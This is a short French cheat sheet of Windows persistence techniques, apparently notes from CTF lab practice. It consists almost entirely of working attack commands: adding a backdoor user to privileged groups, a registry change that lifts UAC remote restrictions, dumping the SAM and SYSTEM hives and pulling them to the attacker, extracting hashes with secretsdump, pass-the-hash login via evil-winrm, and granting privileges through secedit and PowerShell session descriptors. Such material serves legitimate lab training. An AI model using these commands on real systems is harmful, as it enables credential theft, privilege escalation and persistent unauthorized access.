# Windows
Quelques techniques de persistence sur windows

## Commandes

```
evil-winrm -i <IP> -u MyUser -p MyPassword
xfreerdp /u:MyUser /p:MyPassword /v:<IP> +clipboard
```
## Sur la machine [victime]
```
net localgroup administrators MyUser /add
net localgroup "Backup Operators" MyUser /add
net localgroup "Remote Management Users" MyUser /add
```
Si winrm, pour bypass <a href="https://learn.microsoft.com/fr-fr/windows/security/application-security/application-control/user-account-control/how-it-works">UAC</a>
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Avec un utilisateur qui a les privilèges [WinRM] <a href="https://github.com/fortra/impacket">Repo GitHub ici!</a>
```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```
[Attaquant]
```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
evil-winrm -i 10.10.66.252 -u Administrator -H <theHash>
```
<br>
<br>

## Special Privileges and Security Descriptors

```
secedit /export /cfg config.inf
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/58320646-9e80-4e67-8fa1-7d529653acc9)

```
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```
On doit maintenant avoir les privilèges `Backup Operator`.

si utilisation de winrm, sur le GUI taper [PowerShell]
```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
Y ajouter l'utilisateur
